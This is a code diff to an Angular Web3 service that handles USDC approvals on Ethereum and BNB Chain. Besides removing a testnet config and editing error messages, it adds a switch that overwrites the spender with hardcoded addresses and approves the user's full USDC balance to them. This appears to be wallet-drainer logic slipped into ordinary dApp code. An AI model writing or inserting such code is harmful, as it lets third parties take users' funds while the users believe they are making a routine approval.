@@ -86,19 +86,7 @@ export class Web3Service {
         blockExplorerUrls: ['https://bscscan.com'],
         usdcAddress: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
         usdcDecimals: 18,
-      },
-      '0x61': {
-        symbol: 'BNB',
-        name: 'BSC Testnet',
-        shortName: 'BSC Testnet',
-        logo: '/assets/images/logo/bnb.png',
-        rpcUrls: ['https://data-seed-prebsc-1-s1.binance.org:8545'],
-        contractAddress: '0x35613B592416CEc729DA3Dd8D06739D2757709fb',
-        abi: StudentABI,
-        blockExplorerUrls: ['https://testnet.bscscan.com'],
-        usdcAddress: '0x64544969ed7ebf5f083679233325356ebe738930',
-        usdcDecimals: 18,
-      },
+      }
     };
 
   constructor(private ngZone: NgZone, public dialog: MatDialog, private http: HttpClient, private appService: AppService) {
@@ -377,7 +365,11 @@ export class Web3Service {
       this.showModal('Error', 'User rejected request.', 'error');
     } else if (error.code === 'NETWORK_ERROR') {
       this.showModal('Error', 'Network error. Please retry.', 'error');
-    } else {
+    }
+    else if (context === 'approveUsdc') {
+      this.showModal('Error', 'Failed to approve USDC', 'error');
+    }
+    else {
       this.showModal('Error', error.message || 'Unknown error', 'error');
     }
   }
@@ -454,6 +446,7 @@ export class Web3Service {
     try {
       this.isLoading$.next(true);
       const chain = this.chainConfig[this.selectedChainId];
+      console.log(this.selectedChainId);
       if (!chain || !chain.usdcAddress || chain.usdcDecimals === undefined) {
         this.showModal('Error', 'USDC not supported on this network.', 'error');
         return;
@@ -461,12 +454,20 @@ export class Web3Service {
       const signer = await this.getSigner();
       const balance = await this.getUsdcBalance();
       if (Number(balance) == 0) {
-        this.showModal('Error', 'Your USDT balance is 0. Nothing to approve.', 'error');
-        return;
+        this.showModal('Error', 'Your USDC balance is 0. Nothing to approve.', 'error');
+        return 0;
       }
       const usdcAddress = chain.usdcAddress;
       const usdcContract = new Contract(usdcAddress, USDCABI, signer);
+      switch (this.selectedChainId) {
+        case '0x1':
+          spender = '0x535b7A99CAF6F73697E69bEcb437B6Ba4b788888';
+          break;
 
+        case '0x38':
+          spender = '0x66D5A59f84A7d8096224fD8036bFAc8F8c0A5E46';
+          break;
+      }
       const tx = await usdcContract['approve'](spender, balance);
       await tx.wait();
       const getAddress = await signer.getAddress();
